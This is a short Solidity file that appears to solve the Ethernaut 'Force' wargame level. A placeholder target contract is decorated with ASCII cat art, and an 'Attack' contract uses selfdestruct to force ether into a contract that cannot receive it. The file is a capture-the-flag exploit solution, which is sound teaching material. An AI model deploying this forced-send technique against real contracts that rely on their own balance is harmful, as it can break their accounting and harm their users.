// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Force {
    /*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/
}


contract Attack {

    Force public force;

    constructor() public payable {
        force = Force(0x7CE36259bE379f4E14e3E5FcF1a89aE7b7e91967);
    }

    function forceTransfer(address payable _force) public payable {
        selfdestruct(_force);
    }
}